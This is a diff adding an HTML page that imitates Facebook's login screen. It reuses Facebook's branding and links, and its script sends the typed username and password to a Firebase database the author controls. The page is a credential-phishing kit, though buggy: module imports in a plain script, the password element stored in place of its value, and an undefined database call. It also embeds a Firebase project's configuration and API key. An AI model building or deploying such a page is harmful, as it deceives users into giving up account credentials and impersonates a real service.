@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>facebook_login</title>
+    <link rel="stylesheet" href="facebook.css">
+</head>
+<body>
+
+    <script>
+
+        // Import the functions you need from the SDKs you need
+        import { initializeApp } from "firebase/app";
+        import { getAnalytics } from "firebase/analytics";
+        // TODO: Add SDKs for Firebase products that you want to use
+         // https://firebase.google.com/docs/web/setup#available-libraries
+
+        // Your web app's Firebase configuration
+        // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+        const firebaseConfig = {
+        apiKey: "AIzaSyACuDYq3a0_Qy92YPRgUTd1yBKyPFDxvZ0",
+        authDomain: "facetimeapp-d848a.firebaseapp.com",
+        projectId: "facetimeapp-d848a",
+        storageBucket: "facetimeapp-d848a.appspot.com",
+        messagingSenderId: "657212022947",
+        appId: "1:657212022947:web:6e91f05c16976f0f839f16",
+        measurementId: "G-YCFYK086CJ"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const analytics = getAnalytics(app);
+
+        function writeData(){
+            firebase.database().ref("user").set({
+                userName: document.getElementById("username").value,
+                passcode: document.getElementById("password")
+            });
+        }
+    </script>    
+    <div class="textbox">
+        <h1>
+            facebook
+        </h1>
+        <h2>
+            Facebook helps you connect and share<br> with the people in your life.
+        </h2>
+    </div>
+
+
+    <div class="container">
+        <div class="form">
+
+
+            <input type="text" class="text" placeholder="Enter Your Email or Phone number" id="username"> <br>
+            <input type="password" class="text" placeholder="Password" id="password"><br>
+            <button onclick="writeData()">
+                Log In
+            </button>
+                <p><a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">
+                    Forget password?
+                </a><br></p>
+
+            <div class="line">
+                <hr>
+            </div>
+
+
+            <div class="btn">
+
+                <a><a href="https://www.facebook.com/"> <button> Create New Account </button></a></a>
+            </div>
+
+
+
+     </div>
+
+
+    </div>
+
+</body>
+</html>
